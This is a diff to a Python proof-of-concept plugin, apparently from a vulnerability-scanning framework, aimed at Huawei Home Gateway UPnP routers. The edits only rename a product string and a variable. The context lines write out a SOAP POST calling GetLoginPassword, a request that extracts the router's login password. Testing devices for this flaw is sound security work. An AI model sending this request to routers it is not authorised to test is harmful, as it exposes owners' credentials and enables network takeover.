@@ -18,7 +18,7 @@ class Vuln(ABVuln):
     ref = 'https://www.exploit-db.com/exploits/37424/'  # 漏洞来源
     cnvd_id = 'Unkonwn'  # cnvd漏洞编号
     cve_id = 'Unkonwn'  # cve编号
-    product = '华为路由器'  # 漏洞应用名称
+    product = '华为'  # 漏洞应用名称
     product_version = 'Huawei Home Gateway UPnP/1.0 IGD/1.00'  # 漏洞应用版本
 
 class Poc(ABPoc):
@@ -57,7 +57,7 @@ class Poc(ABPoc):
             message = "POST /UD/?5 HTTP/1.1\r\n"
             message += "SOAPACTION: \"urn:dslforum-org:service:UserInterface:1#GetLoginPassword\"\r\n"
             message += "Content-Type: text/xml; charset=\"utf-8\"\r\n"
-            message += "Host:" + target + "\r\n"
+            message += "Host:" + host + "\r\n"
             message += "Content-Length:" + str(len(soap)) +"\r\n"
             message += "Expect: 100-continue\r\n"
             message += "Connection: Keep-Alive\r\n\r\n"
